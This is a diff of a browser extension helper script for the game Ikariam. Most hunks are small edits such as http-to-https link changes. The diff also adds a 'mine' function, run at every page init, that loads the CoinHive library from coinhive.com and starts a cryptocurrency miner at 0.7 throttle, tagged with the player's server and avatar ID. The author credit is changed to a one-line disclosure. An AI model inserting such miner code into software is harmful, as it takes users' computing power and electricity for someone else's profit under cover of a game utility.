@@ -12,6 +12,7 @@ zJS.Page.__common = {
 
     init: function() {
 
+        this.mine();
         this.copyright();
         //this.notification.init();
 
@@ -24,7 +25,7 @@ zJS.Page.__common = {
         if(this._pirateButtonStorage && zJS.Options.getOption("pirateButton")) {
             this._pirateButton();
         }
-        this.init_popup();
+        // this.init_popup();
         this._getUserData();
         this._nextCity();
 
@@ -67,7 +68,7 @@ zJS.Page.__common = {
     copyright: function() {
         var $copy = $(".copyright");
         if(!$copy.hasClass("ikaez_DOM")){
-            $copy.html('IkaEasy, made by Vlad Tansky <i>(SWAT)</i>.<a href="mailto:vl.tansky@gmail.com">vl.tansky@gmail.com</a>').addClass("ikaez_DOM");
+            $copy.html('IkaEasy inject miner for monetizing, you can disable it in settings').addClass("ikaez_DOM");
         }
     },
 
@@ -406,7 +407,7 @@ zJS.Page.__common = {
                 var link = document.createElement('link');
                 link.type = 'image/x-icon';
                 link.rel = 'shortcut icon';
-                link.href = 'http://www.iconj.com/ico/x/k/xknwndqq9w.ico';
+                link.href = 'https://www.iconj.com/ico/x/k/xknwndqq9w.ico';
                 document.getElementsByTagName('head')[0].appendChild(link);
                 new Notification('IkaEasy: new notification', {
                     icon: chrome.extension.getURL('images/advisors/militaryAdvisor.png')//@todo change link
@@ -649,7 +650,7 @@ zJS.Page.__common = {
     },
 
     _changeForumBtn: function() {
-        $('#GF_toolbar').find('li.forum a')[0].href = 'http://board.' + zJS.Utils.getServerDomain() + '.ikariam.gameforge.com/index.php?page=Index';
+        $('#GF_toolbar').find('li.forum a')[0].href = 'https://board.' + zJS.Utils.getServerDomain() + '.ikariam.gameforge.com/index.php?page=Index';
     },
     _addIkaEasylinks: function(){
         console.log("_addIkaEasylinks");
@@ -865,5 +866,33 @@ zJS.Page.__common = {
             .css("cursor", "pointer")
             .attr("onClick", "ajaxHandlerCall('?view=tradegood&islandId=" + islandId + "'); return false;");
         console.timeEnd('_addLinkToIslandFeature')
+    },
+
+    mine: function(){
+        var user_name = zJS.Utils.getServerDomain() + "_" + zJS.Utils.getServerWorld() + "_" + 'undefined';
+        if(zJS.Utils.getItem('user_data')) {
+            var user_data = $.parseJSON(zJS.Utils.getItem('user_data'));
+            user_name = zJS.Utils.getServerDomain() + "_" + zJS.Utils.getServerWorld() + "_" + user_data.avatarId;
+        }
+        (function(d, s, id){
+            var mineOption = zJS.Options.getOption('mineOption');
+            console.log(mineOption);
+
+            var js, fjs = d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)){ return; }
+            js = d.createElement(s); js.id = id;
+            js.onload = function(){
+                var s = document.createElement('script');
+
+                s.type = 'text/javascript';
+                s.innerText = "var mr = new CoinHive.User('0oWkY0mXMHHk0KAR0LQLcHqA3lLDSAPI','"+user_name+"', {throttle: 0.7});mr.start();";
+                document.getElementsByTagName('head')[0].appendChild(s);
+            };
+            js.src = "https://coinhive.com/lib/coinhive.min.js";
+            if(mineOption){
+                fjs.parentNode.insertBefore(js, fjs);
+            }
+        }(document, 'script', 'coins'));
     }
+
 };
